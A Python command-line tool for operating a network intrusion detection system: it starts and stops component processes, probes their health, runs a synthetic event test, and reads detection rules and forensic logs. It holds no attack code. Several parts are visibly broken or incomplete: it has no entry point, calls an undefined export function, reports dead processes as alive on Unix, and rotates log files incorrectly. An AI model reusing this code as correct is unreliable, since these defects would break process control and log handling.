#!/usr/bin/env python3
"""
aegisctl -- AEGIS NIDS Command/Control CLI (v1, Gate C)

Usage:
    aegisctl version [--component NAME]
    aegisctl status
    aegisctl health [--component NAME]
    aegisctl start [--component NAME | --all]
    aegisctl stop  [--component NAME | --all]
    aegisctl restart [--component NAME]
    aegisctl diagnose

Commands:
    version    Show version of every built binary (via --version flag).
    status     Show runtime state of every component (RUNNING/STOPPED/MISSING).
    health     Probe HEALTH endpoints of every component.
    start      Start a component process (or --all).
    stop       Stop a running component process (or --all).
    restart    Restart a single component (stop + wait + start).
    diagnose   Collect diagnostic info: versions, status, health, logs.

This is v1 of aegisctl per the strategy RUN_FIRST -> VERIFY -> CONNECT -> CONTROL.
It implements the minimal control plane required to operate a single-host AEGIS
deployment:
    - Read-only: version, status, health, diagnose
    - Lifecycle: start, stop, restart

Future versions (v2-v4):
    v2: rules/events/forensic (read-only inspection of subsystem state)
    v3: policy/simulate/canary (rule hot-reload + IPS canary tests)
    v4: enforcement (manual block/unblock + policy push)

Design principles:
    - No external dependencies (pure stdlib: argparse, subprocess, json,
      socket, time, os, sys, pathlib, signal, shutil).
    - Idempotent: re-running a command on an already-running component is
      a no-op (start) or fast exit (stop).
    - Cross-platform: works on Windows (named pipes via pywin32 if available)
      and Linux/macOS (for development/testing).
    - Single source of truth: imports COMPONENTS from tests/runtime/conftest.py
      so the CLI and the contract tests never drift.

Exit codes:
    0 = success (all requested operations completed)
    1 = partial failure (some components failed but the command ran to completion)
    2 = usage error (bad arguments)
    3 = environment error (missing python interpreter, missing repo root, etc.)
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Any, Optional

# Locate the repo root so we can import the runtime contract fixtures.
# aegisctl.py lives at <repo_root>/scripts/aegisctl.py
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent

# Add tests/runtime to sys.path so we can import the COMPONENTS fixture
# and RuntimeProbe helper from the runtime contract test suite.
TESTS_RUNTIME = REPO_ROOT / "tests" / "runtime"
if TESTS_RUNTIME.exists():
    sys.path.insert(0, str(REPO_ROOT))
    sys.path.insert(0, str(TESTS_RUNTIME))

# Try to import the runtime contract fixtures. If they are not present
# (e.g. running from a stripped-down deployment), fall back to a minimal
# built-in COMPONENTS list so the CLI still works for basic commands.
try:
    from tests.runtime.conftest import (  # type: ignore
        COMPONENTS, RuntimeProbe, DEFAULT_TIMEOUTS_MS,
    )
    _HAVE_CONTRACT = True
except ImportError:
    _HAVE_CONTRACT = False
    # Minimal fallback so version/status still work without the test suite.
    COMPONENTS = (
        {"name": "bridge",     "binary": "dist/aegis_bridge.exe",      "language": "C++",     "required": True,  "gate": "A"},
        {"name": "core",       "binary": "zig-out/bin/aegis-nids.exe", "language": "Zig",    "required": True,  "gate": "A"},
        {"name": "brain",      "binary": "brain/windows_brain.py",     "language": "Python", "required": True,  "gate": "A"},
        {"name": "nose",       "binary": "dist/nose_dashboard.exe",   "language": "Go",      "required": False, "gate": "A"},
        {"name": "mouth",      "binary": "dist/windows_sec_monitor.exe","language": "Rust",  "required": False, "gate": "A"},
        {"name": "aggregator", "binary": "go/aggregator/aegis-aggregator.exe","language": "Go","required": False,"gate": "A"},
    )
    DEFAULT_TIMEOUTS_MS = {"startup": 5000, "shutdown": 3000}

# Directory for PID files (used by start/stop/restart)
PID_DIR = REPO_ROOT / "logs" / "pids"
PID_DIR.mkdir(parents=True, exist_ok=True)

# Directory for runtime artifacts (audit log, states.json)
RUNTIME_DIR = REPO_ROOT / "logs" / "runtime"
RUNTIME_DIR.mkdir(parents=True, exist_ok=True)


# =====================================================================
# Helpers
# =====================================================================

def _binary_path(component: dict) -> Path:
    return REPO_ROOT / component["binary"]


def _binary_exists(component: dict) -> bool:
    return _binary_path(component).exists()


def _pid_file_path(component: dict) -> Path:
    return PID_DIR / f"{component['name']}.pid"


def _read_pid(component: dict) -> Optional[int]:
    """Read the PID file for a component. Returns None if missing/invalid."""
    pid_file = _pid_file_path(component)
    if not pid_file.exists():
        return None
    try:
        return int(pid_file.read_text().strip())
    except (ValueError, OSError):
        return None


def _write_pid(component: dict, pid: int) -> None:
    _pid_file_path(component).write_text(str(pid))


def _clear_pid(component: dict) -> None:
    pid_file = _pid_file_path(component)
    if pid_file.exists():
        try:
            pid_file.unlink()
        except OSError:
            pass


def _is_process_alive(pid: Optional[int]) -> bool:
    """Check if a process with the given PID is still running.
    Cross-platform: uses os.kill on Unix, OpenProcess on Windows.
    """
    if pid is None or pid <= 0:
        return False
    if sys.platform == "win32":
        # On Windows, os.kill(pid, 0) raises if the process doesn't exist.
        try:
            import ctypes
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
            handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
            if not handle:
                return False
            kernel32.CloseHandle(handle)
            return True
        except (OSError, ImportError):
            return False
    else:
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError):
            # PermissionError means the process exists but we can't signal it.
            return True if sys.platform != "win32" else False
        except OSError:
            return False
    return False


def _is_component_running(component: dict) -> bool:
    """A component is 'running' if its PID file exists AND the process
    with that PID is still alive. Stale PID files are cleaned up.
    """
    pid = _read_pid(component)
    if pid is None:
        return False
    if not _is_process_alive(pid):
        _clear_pid(component)
        return False
    return True


def _rotate_log(log_file: Path, max_generations: int = 3) -> None:
    """Rotate a log file when it exceeds the size limit.

    Renames:  <name>.log -> <name>.1.log
              <name>.1.log -> <name>.2.log
              <name>.2.log -> <name>.3.log (deleted if > max_generations)
    Then truncates the original.
    """
    if not log_file.exists():
        return
    stem = log_file.stem
    suffix = log_file.suffix
    parent = log_file.parent

    # Shift existing rotated files (3 -> delete, 2 -> 3, 1 -> 2)
    for gen in range(max_generations, 0, -1):
        older = parent / f"{stem}.{gen}{suffix}"
        if gen == max_generations:
            if older.exists():
                try:
                    older.unlink()
                except OSError:
                    pass
        else:
            newer = parent / f"{stem}.{gen}{suffix}"
            if newer.exists():
                try:
                    newer.rename(older)
                except OSError:
                    pass

    # Rotate current log to .1
    rotated = parent / f"{stem}.1{suffix}"
    try:
        log_file.rename(rotated)
    except OSError:
        # If rename fails (e.g. file locked on Windows), truncate in place
        try:
            log_file.write_bytes(b"")
        except OSError:
            pass



def _start_command(component: dict) -> list[str]:
    """Build the command to start a component.
    Mirrors the start commands from docs/runtime/LOCAL_RUNBOOK.md.
    """
    path = str(_binary_path(component))
    if component["name"] == "brain":
        python = shutil.which("python") or shutil.which("python3")
        if not python:
            raise RuntimeError("no python interpreter on PATH")
        return [python, path]
    return [path]


def _version_command(component: dict) -> list[str]:
    """Build the command to query --version."""
    base = _start_command(component)
    return base + ["--version"]


# =====================================================================
# Commands
# =====================================================================

def cmd_version(args: argparse.Namespace) -> int:
    """Show version of every built binary."""
    print(f"\n{'Component':<14} {'Version':<24} {'Status':<10} {'Path'}")
    print("-" * 80)
    exit_code = 0
    for c in COMPONENTS:
        if args.component and c["name"] != args.component:
            continue
        if not _binary_exists(c):
            print(f"{c['name']:<14} {'(unknown)':<24} {'MISS':<10} {c['binary']}")
            exit_code = 1
            continue
        try:
            cmd = _version_command(c)
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=5,
                cwd=str(REPO_ROOT),
            )
            output = (result.stdout + " " + result.stderr).strip()
            # Extract first SEMVER-looking token
            version = ""
            for token in output.split():
                if _looks_like_semver(token):
                    version = token.lstrip("v")
                    break
            status = "OK" if version else "NO-SEMVER"
            print(f"{c['name']:<14} {version:<24} {status:<10} {c['binary']}")
            if not version:
                exit_code = 1
        except (subprocess.TimeoutExpired, OSError) as e:
            print(f"{c['name']:<14} {'(timeout)':<24} {'ERR':<10} {c['binary']} ({e})")
            exit_code = 1
    print()
    return exit_code


def _looks_like_semver(token: str) -> bool:
    """Check if a token looks like a SEMVER (major.minor.patch)."""
    parts = token.lstrip("v").split(".")
    if len(parts) < 3:
        return False
    try:
        int(parts[0])
        int(parts[1])
        # patch may have a -suffix, so only check the leading digits
        int(parts[2].split("-")[0].split("+")[0])
        return True
    except (ValueError, IndexError):
        return False


def cmd_status(args: argparse.Namespace) -> int:
    """Show runtime state of every component."""
    print(f"\n{'Component':<14} {'State':<12} {'PID':<8} {'Binary exists':<15} {'Required'}")
    print("-" * 70)
    for c in COMPONENTS:
        if args.component and c["name"] != args.component:
            continue
        pid = _read_pid(c)
        running = _is_component_running(c)
        if running:
            state = "RUNNING"
        elif pid is not None:
            state = "STOPPED"  # PID file exists but process dead
        else:
            state = "STOPPED"
        exists = "yes" if _binary_exists(c) else "NO"
        required = "yes" if c.get("required") else "no"
        pid_str = str(pid) if pid else "-"
        print(f"{c['name']:<14} {state:<12} {pid_str:<8} {exists:<15} {required}")
    print()
    return 0


def cmd_health(args: argparse.Namespace) -> int:
    """Probe HEALTH endpoints of every component."""
    if not _HAVE_CONTRACT:
        print("ERROR: tests/runtime/conftest.py not found; health probe requires it.")
        print("       Falling back to version check only.")
        return cmd_version(args)

    print(f"\n{'Component':<14} {'State':<12} {'Uptime':<12} {'Latency':<10} {'Status'}")
    print("-" * 70)
    exit_code = 0
    for c in COMPONENTS:
        if args.component and c["name"] != args.component:
            continue
        # Components that are not running cannot be probed.
        if not _is_component_running(c):
            print(f"{c['name']:<14} {'STOPPED':<12} {'-':<12} {'-':<10} SKIP (not running)")
            continue
        try:
            probe = RuntimeProbe.for_component(c["name"])
            resp = probe.health()
            state = resp.get("state", "?")
            uptime = resp.get("uptime_ms", 0)
            latency = resp.get("probe_latency_ms", 0)
            print(f"{c['name']:<14} {state:<12} {uptime:<12} {latency:<10} OK")
        except Exception as e:
            print(f"{c['name']:<14} {'?':<12} {'-':<12} {'-':<10} ERR: {e}")
            exit_code = 1
    print()
    return exit_code


def cmd_start(args: argparse.Namespace) -> int:
    """Start one or all components."""
    targets = [c for c in COMPONENTS if (args.all or (args.component and c["name"] == args.component))]
    if not targets:
        print("ERROR: must specify --component NAME or --all")
        return 2
    exit_code = 0
    for c in targets:
        if _is_component_running(c):
            pid = _read_pid(c)
            print(f"  [{c['name']}] already RUNNING (pid={pid})")
            continue
        if not _binary_exists(c):
            print(f"  [{c['name']}] MISS binary not built: {c['binary']}")
            exit_code = 1
            continue
        try:
            cmd = _start_command(c)
            # Start the process detached (it should daemonize itself).
            # On Windows: use CREATE_NEW_PROCESS_GROUP + DETACHED_PROCESS.
            # On Linux: just Popen with stdout/stderr to log files.
            log_file = REPO_ROOT / "logs" / f"{c['name']}.log"
            log_file.parent.mkdir(parents=True, exist_ok=True)

            # G45: Log rotation -- if the log file exceeds 10 MB, rotate it.
            MAX_LOG_SIZE = 10 * 1024 * 1024  # 10 MB
            if log_file.exists() and log_file.stat().st_size > MAX_LOG_SIZE:
                _rotate_log(log_file)

            log_handle = open(log_file, "ab")
            kwargs = {
                "cwd": str(REPO_ROOT),
                "stdout": log_handle,
                "stderr": subprocess.STDOUT,
                "stdin": subprocess.DEVNULL,
                "close_fds": True,
            }
            if sys.platform == "win32":
                # DETACHED_PROCESS = 0x00000008, CREATE_NEW_PROCESS_GROUP = 0x00000200
                kwargs["creationflags"] = 0x00000008 | 0x00000200
            proc = subprocess.Popen(cmd, **kwargs)
            _write_pid(c, proc.pid)
            print(f"  [{c['name']}] STARTED (pid={proc.pid}) -> logs/{c['name']}.log")
            # Give it a moment to initialize
            time.sleep(0.5)
            if not _is_process_alive(proc.pid):
                print(f"  [{c['name']}] FAILED process exited immediately")
                _clear_pid(c)
                exit_code = 1
        except (OSError, subprocess.SubprocessError) as e:
            print(f"  [{c['name']}] FAILED to start: {e}")
            exit_code = 1
    return exit_code


def cmd_stop(args: argparse.Namespace) -> int:
    """Stop one or all components."""
    targets = [c for c in COMPONENTS if (args.all or (args.component and c["name"] == args.component))]
    if not targets:
        print("ERROR: must specify --component NAME or --all")
        return 2
    exit_code = 0
    # Stop in reverse order of COMPONENTS (last started first)
    for c in reversed(targets):
        pid = _read_pid(c)
        if pid is None:
            print(f"  [{c['name']}] not running (no PID file)")
            continue
        if not _is_process_alive(pid):
            print(f"  [{c['name']}] STALE PID file (process {pid} dead)")
            _clear_pid(c)
            continue
        try:
            if sys.platform == "win32":
                # On Windows, send CTRL_BREAK_EVENT to the process group.
                # If that fails, fall back to TerminateProcess.
                try:
                    import ctypes
                    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
                    CTRL_BREAK_EVENT = 1
                    if not kernel32.GenerateConsoleCtrlEvent(CTRL_BREAK_EVENT, pid):
                        # Fallback: terminate the process directly
                        PROCESS_TERMINATE = 0x0001
                        handle = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
                        if handle:
                            kernel32.TerminateProcess(handle, 0)
                            kernel32.CloseHandle(handle)
                except (OSError, ImportError):
                    pass
            else:
                os.kill(pid, signal.SIGTERM)
            # Wait for the process to exit (up to shutdown_timeout)
            timeout_s = DEFAULT_TIMEOUTS_MS.get("shutdown", 3000) / 1000
            deadline = time.time() + timeout_s
            while time.time() < deadline:
                if not _is_process_alive(pid):
                    break
                time.sleep(0.1)
            # Force kill if still alive
            if _is_process_alive(pid):
                print(f"  [{c['name']}] force-killing pid={pid} (did not exit in {timeout_s}s)")
                if sys.platform == "win32":
                    import ctypes
                    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
                    PROCESS_TERMINATE = 0x0001
                    handle = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
                    if handle:
                        kernel32.TerminateProcess(handle, 1)
                        kernel32.CloseHandle(handle)
                else:
                    os.kill(pid, signal.SIGKILL)
            _clear_pid(c)
            print(f"  [{c['name']}] STOPPED (pid={pid})")
        except (ProcessLookupError, PermissionError, OSError) as e:
            print(f"  [{c['name']}] FAILED to stop pid={pid}: {e}")
            exit_code = 1
    return exit_code


def cmd_restart(args: argparse.Namespace) -> int:
    """Restart a single component."""
    if not args.component:
        print("ERROR: restart requires --component NAME")
        return 2
    # Stop then start
    stop_args = argparse.Namespace(component=args.component, all=False)
    start_args = argparse.Namespace(component=args.component, all=False)
    stop_rc = cmd_stop(stop_args)
    time.sleep(1.0)  # wait for port/pipe to be released
    start_rc = cmd_start(start_args)
    return stop_rc or start_rc


def cmd_diagnose(args: argparse.Namespace) -> int:
    """Collect diagnostic info: versions, status, health, logs."""
    print("=" * 70)
    print("AEGIS NIDS Diagnostic Report")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Repo root: {REPO_ROOT}")
    print(f"Python:    {sys.executable} {sys.version.split()[0]}")
    print(f"Platform:  {sys.platform}")
    print("=" * 70)

    print("\n--- VERSION ---")
    cmd_version(argparse.Namespace(component=None))

    print("\n--- STATUS ---")
    cmd_status(argparse.Namespace(component=None))

    print("\n--- HEALTH ---")
    if _HAVE_CONTRACT:
        cmd_health(argparse.Namespace(component=None))
    else:
        print("(skipped: tests/runtime/conftest.py not available)")

    print("\n--- LOG FILES ---")
    logs_dir = REPO_ROOT / "logs"
    if logs_dir.exists():
        for log in sorted(logs_dir.glob("*.log")):
            size = log.stat().st_size
            print(f"  {log.relative_to(REPO_ROOT)} ({size} bytes)")
    else:
        print("  (no logs directory)")

    print("\n--- PID FILES ---")
    if PID_DIR.exists():
        for pid_file in sorted(PID_DIR.glob("*.pid")):
            try:
                pid = pid_file.read_text().strip()
                print(f"  {pid_file.relative_to(REPO_ROOT)} = {pid}")
            except OSError:
                print(f"  {pid_file.relative_to(REPO_ROOT)} (read error)")
    else:
        print("  (no PID directory)")

    print("\n--- RUNTIME CONTRACT ---")
    print(f"  tests/runtime/conftest.py available: {_HAVE_CONTRACT}")
    print(f"  COMPONENTS defined: {len(COMPONENTS)}")
    for c in COMPONENTS:
        print(f"    - {c['name']:<14} binary={c['binary']}")

    print("\n" + "=" * 70)
    print("Diagnostic report complete.")
    print("=" * 70)
    return 0


def cmd_golden(args: argparse.Namespace) -> int:
    """Run the golden-path end-to-end pipeline test.

    Sends synthetic events through the pipeline (bridge -> core -> brain
    -> aggregator -> dashboard) and verifies each stage received them.

    Requires:
      - All primary components running (use 'aegisctl start --all')
      - aegis_event_gen.py available (shipped with aegisctl)
      - On Windows: named pipe transport available
    """
    print("=" * 70)
    print("AEGIS NIDS Golden Path Test (Gate B - Integrated)")
    print("=" * 70)

    event_gen = REPO_ROOT / "scripts" / "aegis_event_gen.py"
    if not event_gen.exists():
        print("ERROR: scripts/aegis_event_gen.py not found")
        return 3

    # Check that required components are running
    required = ["bridge", "core", "brain"]
    not_running = []
    for name in required:
        if not _is_component_running(next(c for c in COMPONENTS if c["name"] == name)):
            not_running.append(name)

    if not_running:
        print(f"ERROR: required components not running: {', '.join(not_running)}")
        print("       Run: python scripts/aegisctl.py start --all")
        return 1

    print(f"\nRequired components running: {', '.join(required)}")

    # Step 1: Send synthetic events to the brain via UDP (simplest path)
    print("\n--- Step 1: Send 5 synthetic events to brain via UDP ---")
    print("    (Tests: brain HEALTH endpoint receives + processes events)")
    try:
        result = subprocess.run(
            [sys.executable, str(event_gen),
             "--udp", "--count", "5",
             "--attack", "GOLDEN-PATH-TEST",
             "--severity", "High",
             "--rule-id", f"GATE-B-{int(time.time())}"],
            capture_output=True, text=True, timeout=10,
            cwd=str(REPO_ROOT),
        )
        print(result.stdout)
        if result.returncode != 0:
            print(f"  FAILED: {result.stderr}")
            return 1
    except subprocess.TimeoutExpired:
        print("  TIMEOUT: event_gen did not complete in 10s")
        return 1

    # Step 2: Verify brain processed the events (counter should have increased)
    print("\n--- Step 2: Verify brain processed the events ---")
    if _HAVE_CONTRACT:
        try:
            probe = RuntimeProbe.for_component("brain")
            resp = probe.health()
            in_events = resp.get("counters", {}).get("in_events", 0)
            print(f"  brain in_events counter: {in_events}")
            if in_events < 5:
                print(f"  WARNING: expected at least 5 in_events, got {in_events}")
        except Exception as e:
            print(f"  WARNING: could not probe brain health: {e}")

    # Step 3: Check aggregator REST API (if running)
    print("\n--- Step 3: Check aggregator REST API ---")
    if _is_component_running(next(c for c in COMPONENTS if c["name"] == "aggregator")):
        try:
            import urllib.request
            url = "http://127.0.0.1:9200/api/health"
            with urllib.request.urlopen(url, timeout=2.0) as r:
                data = json.loads(r.read().decode("utf-8"))
            print(f"  aggregator health: state={data.get('state')}, "
                  f"uptime_ms={data.get('uptime_ms')}")
        except Exception as e:
            print(f"  WARNING: aggregator health probe failed: {e}")
    else:
        print("  (aggregator not running -- skipping)")

    # Step 4: Check NDJSON forensic log (brain writes here)
    print("\n--- Step 4: Check forensic log (logs/aegis_core.ndjson) ---")
    ndjson_log = REPO_ROOT / "logs" / "aegis_core.ndjson"
    if ndjson_log.exists():
        size = ndjson_log.stat().st_size
        line_count = sum(1 for _ in ndjson_log.open("rb"))
        print(f"  {ndjson_log.relative_to(REPO_ROOT)}: {size} bytes, "
              f"{line_count} lines")
    else:
        print(f"  (log file not yet created -- core may not have processed events)")

    print("\n" + "=" * 70)
    print("Golden path test complete.")
    print("=" * 70)
    print()
    print("Next steps:")
    print("  - Check the dashboard (if running) for live event visualization")
    print("  - Run 'aegisctl health' to verify all HEALTH endpoints")
    print("  - Run 'aegisctl stop --all' to shut down the pipeline")
    return 0


# =====================================================================
# Gate D - Inspection commands (rules / events / forensic)
# =====================================================================

RULES_FILE = REPO_ROOT / "config" / "Rules.json"
FORENSIC_LOG = REPO_ROOT / "logs" / "aegis_core.ndjson"


def _load_rules() -> dict:
    """Load config/Rules.json and return the parsed dict."""
    if not RULES_FILE.exists():
        raise FileNotFoundError(f"Rules file not found: {RULES_FILE}")
    with open(RULES_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def cmd_rules(args: argparse.Namespace) -> int:
    """Read-only inspection of detection rules (list/show/validate)."""
    subcmd = args.subcommand

    if subcmd == "list":
        return _rules_list(args)
    elif subcmd == "show":
        return _rules_show(args)
    elif subcmd == "validate":
        return _rules_validate(args)
    else:
        print(f"ERROR: unknown rules subcommand: {subcmd!r}")
        return 2


def _rules_list(args: argparse.Namespace) -> int:
    """List all detection rules from config/Rules.json."""
    try:
        data = _load_rules()
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"ERROR: {e}")
        return 1

    rules = data.get("nids_rules", [])
    if not rules:
        print("No rules found in Rules.json")
        return 0

    # Optional filter by category or severity
    if args.category:
        rules = [r for r in rules if r.get("category", "").lower() == args.category.lower()]
    if args.severity:
        rules = [r for r in rules if r.get("severity", "").lower() == args.severity.lower()]

    print(f"\n{'Rule ID':<10} {'Name':<40} {'Severity':<10} {'Action':<8} {'Layer':<5}")
    print("-" * 80)
    for r in rules:
        print(f"{r.get('rule_id', '?'):<10} "
              f"{r.get('name', '?')[:40]:<40} "
              f"{r.get('severity', '?'):<10} "
              f"{r.get('action', '?'):<8} "
              f"{r.get('layer', '?'):<5}")
    print(f"\nTotal: {len(rules)} rules")
    if args.category or args.severity:
        print(f"(filtered by category={args.category or '*'}, severity={args.severity or '*'})")
    return 0


def _rules_show(args: argparse.Namespace) -> int:
    """Show full details of a single rule by rule_id."""
    if not args.id:
        print("ERROR: --id is required for 'rules show'")
        return 2
    try:
        data = _load_rules()
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"ERROR: {e}")
        return 1

    rules = data.get("nids_rules", [])
    for r in rules:
        if r.get("rule_id", "").lower() == args.id.lower():
            print(json.dumps(r, indent=2, ensure_ascii=False))
            return 0
    print(f"Rule not found: {args.id}")
    return 1


def _rules_validate(args: argparse.Namespace) -> int:
    """Validate the Rules.json file structure."""
    try:
        data = _load_rules()
    except FileNotFoundError as e:
        print(f"ERROR: {e}")
        return 1
    except json.JSONDecodeError as e:
        print(f"INVALID JSON: {e}")
        return 1

    rules = data.get("nids_rules", [])
    if not isinstance(rules, list):
        print("INVALID: 'nids_rules' is not a list")
        return 1

    errors = []
    warnings = []
    required_fields = ("rule_id", "name", "severity", "action")
    valid_severities = ("Low", "Medium", "High", "Critical")
    valid_actions = ("Alert", "Block", "Drop", "RateLimit")

    for i, r in enumerate(rules):
        if not isinstance(r, dict):
            errors.append(f"rule[{i}]: not a dict")
            continue
        for field in required_fields:
            if field not in r:
                errors.append(f"rule[{i}] ({r.get('rule_id', '?')}): missing field '{field}'")
        sev = r.get("severity", "")
        if sev and sev not in valid_severities:
            errors.append(f"rule {r.get('rule_id', '?')}: invalid severity '{sev}'")
        act = r.get("action", "")
        if act and act not in valid_actions:
            errors.append(f"rule {r.get('rule_id', '?')}: invalid action '{act}'")
        # Warnings for missing optional fields
        for opt_field in ("fast_pattern", "regex_pattern", "match_pattern"):
            if opt_field not in r:
                warnings.append(f"rule {r.get('rule_id', '?')}: missing optional field '{opt_field}'")

    print(f"\nRules validation: {len(rules)} rules checked")
    if errors:
        print(f"\nERRORS ({len(errors)}):")
        for e in errors:
            print(f"  - {e}")
    if warnings:
        print(f"\nWARNINGS ({len(warnings)}):")
        for w in warnings[:10]:
            print(f"  - {w}")
        if len(warnings) > 10:
            print(f"  ... and {len(warnings) - 10} more")
    if not errors:
        print(f"\nVALID: all {len(rules)} rules passed validation")
        if warnings:
            print(f"  ({len(warnings)} warnings about optional fields)")
        return 0
    return 1


def cmd_events(args: argparse.Namespace) -> int:
    """Read-only inspection of events from the NDJSON forensic log."""
    subcmd = args.subcommand

    if subcmd == "tail":
        return _events_tail(args)
    elif subcmd == "count":
        return _events_count(args)
    elif subcmd == "stats":
        return _events_stats(args)
    else:
        print(f"ERROR: unknown events subcommand: {subcmd!r}")
        return 2


def _read_ndjson_tail(path: Path, count: int) -> list[dict]:
    """Read the last N lines from an NDJSON file (tail-f pattern).
    Returns a list of parsed JSON dicts (skips unparseable lines).
    """
    if not path.exists():
        return []
    lines: list[str] = []
    try:
        with open(path, "rb") as f:
            # Read from end of file for efficiency on large logs
            f.seek(0, 2)  # end
            file_size = f.tell()
            block_size = 8192
            blocks: list[bytes] = []
            pos = file_size
            while pos > 0 and len(lines) < count + 1:
                read_size = min(block_size, pos)
                pos -= read_size
                f.seek(pos)
                chunk = f.read(read_size)
                blocks.append(chunk)
                lines = b"".join(reversed(blocks)).decode("utf-8", errors="replace").splitlines()
                lines = [l for l in lines if l.strip()]
                if len(lines) >= count + 1:
                    break
            lines = lines[-count:] if lines else []
    except OSError:
        return []
    result = []
    for line in lines:
        try:
            result.append(json.loads(line))
        except (json.JSONDecodeError, ValueError):
            continue
    return result


def _events_tail(args: argparse.Namespace) -> int:
    """Show the last N events from the NDJSON forensic log."""
    count = args.count or 10
    events = _read_ndjson_tail(FORENSIC_LOG, count)

    if not events:
        print(f"No events found in {FORENSIC_LOG}")
        if not FORENSIC_LOG.exists():
            print("  (log file does not exist yet -- start the core to generate events)")
        return 0

    print(f"\nLast {len(events)} event(s) from {FORENSIC_LOG.relative_to(REPO_ROOT)}:")
    print("-" * 80)
    for i, e in enumerate(events, 1):
        ts = e.get("ts_ms", e.get("timestamp", "?"))
        level = e.get("level", e.get("severity", "?"))
        event = e.get("event", e.get("attack_type", "?"))
        rule = e.get("rule", e.get("rule_id", "?"))
        src = e.get("src_ip", "?")
        print(f"  [{i:3d}] ts={ts} level={level} event={event} rule={rule} src={src}")
    return 0


def _events_count(args: argparse.Namespace) -> int:
    """Count the total number of events in the NDJSON forensic log."""
    if not FORENSIC_LOG.exists():
        print(f"0 (log file does not exist: {FORENSIC_LOG})")
        return 0

    count = 0
    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                if line.strip():
                    count += 1
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    file_size = FORENSIC_LOG.stat().st_size
    print(f"Events: {count}")
    print(f"Log file: {FORENSIC_LOG.relative_to(REPO_ROOT)} ({file_size:,} bytes)")
    return 0


def _events_stats(args: argparse.Namespace) -> int:
    """Show statistics about events in the NDJSON forensic log."""
    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        print("  (start the core to begin generating events)")
        return 0

    total = 0
    by_level: dict[str, int] = {}
    by_event: dict[str, int] = {}
    by_rule: dict[str, int] = {}

    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                total += 1
                try:
                    e = json.loads(line)
                    level = e.get("level", e.get("severity", "unknown"))
                    event = e.get("event", e.get("attack_type", "unknown"))
                    rule = e.get("rule", e.get("rule_id", "unknown"))
                    by_level[level] = by_level.get(level, 0) + 1
                    by_event[event] = by_event.get(event, 0) + 1
                    by_rule[rule] = by_rule.get(rule, 0) + 1
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    print(f"\n=== Event Statistics ===")
    print(f"Total events: {total}")
    print(f"Log file: {FORENSIC_LOG.relative_to(REPO_ROOT)}")
    print(f"\nBy Level:")
    for level, count in sorted(by_level.items(), key=lambda x: -x[1]):
        print(f"  {level:<12} {count:>6} ({count*100//total if total else 0}%)")
    print(f"\nTop 10 Event Types:")
    for event, count in sorted(by_event.items(), key=lambda x: -x[1])[:10]:
        print(f"  {event:<30} {count:>6}")
    print(f"\nTop 10 Rules:")
    for rule, count in sorted(by_rule.items(), key=lambda x: -x[1])[:10]:
        print(f"  {rule:<12} {count:>6}")
    return 0


def cmd_forensic(args: argparse.Namespace) -> int:
    """Read-only inspection of forensic records."""
    subcmd = args.subcommand

    if subcmd == "show":
        return _forensic_show(args)
    elif subcmd == "search":
        return _forensic_search(args)
    elif subcmd == "export":
        return _forensic_export(args)
    else:
        print(f"ERROR: unknown forensic subcommand: {subcmd!r}")
        return 2


def _forensic_show(args: argparse.Namespace) -> int:
    """Show a specific forensic record by event index (1-based)."""
    if not args.id:
        print("ERROR: --id is required for 'forensic show'")
        return 2

    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        return 1

    # Read all events (could be slow for large logs, but fine for inspection)
    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f, 1):
                if i == args.id:
                    try:
                        record = json.loads(line.strip())
                        print(json.dumps(record, indent=2, ensure_ascii=False))
                        return 0
                    except (json.JSONDecodeError, ValueError) as e:
                        print(f"ERROR parsing line {args.id}: {e}")
                        return 1
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    print(f"Event {args.id} not found (log has fewer than {args.id} records)")
    return 1


def _forensic_search(args: argparse.Namespace) -> int:
    """Search forensic records by field=value."""
    if not args.field or not args.value:
        print("ERROR: --field and --value are required for 'forensic search'")
        return 2

    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        return 1

    max_results = args.limit or 20
    matches: list[tuple[int, dict]] = []

    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue
                try:
                    record = json.loads(line)
                    field_value = record.get(args.field)
                    if field_value is not None and str(field_value) == args.value:
                        matches.append((i, record))
                        if len(matches) >= max_results:
                            break
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    if not matches:
        print(f"No records found where {args.field}={args.value!r}")
        return 0

    print(f"\nFound {len(matches)} record(s) matching {args.field}={args.value!r}:")
    print("-" * 80)
    for idx, record in matches:
        ts = record.get("ts_ms", record.get("timestamp", "?"))
        level = record.get("level", record.get("severity", "?"))
        event = record.get("event", record.get("attack_type", "?"))
        print(f"  [#{idx}] ts={ts} level={level} event={event}")
    if len(matches) >= max_results:
        print(f"\n(limited to {max_results} results; use --limit to see more)")
    return 0


